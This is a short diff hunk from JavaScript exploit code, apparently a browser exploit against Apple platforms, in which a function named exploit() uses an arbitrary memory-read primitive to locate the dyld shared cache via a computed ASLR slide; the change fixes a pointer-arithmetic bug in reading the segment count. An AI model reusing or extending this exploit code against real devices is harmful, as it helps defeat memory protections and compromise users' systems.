@@ -551,7 +551,7 @@ function exploit(){
         var hdr = Add(0x180000000,slide);
         var base_seg = null;
         //var dcache_nsegs = memory.read_i32(base + 0x14);
-        var nsegs = memory.u32(hdr + 0x14);
+        var nsegs = memory.u32(Add(hdr, 0x14));
         //alert("nsegs + 4000 bytes" + memory.u32(Add(hdr,0x4014)))
         log('[+] The dyld shared cache seems to have '+nsegs+' segments.');
         //log(memory.u32(hdr + 0x14))
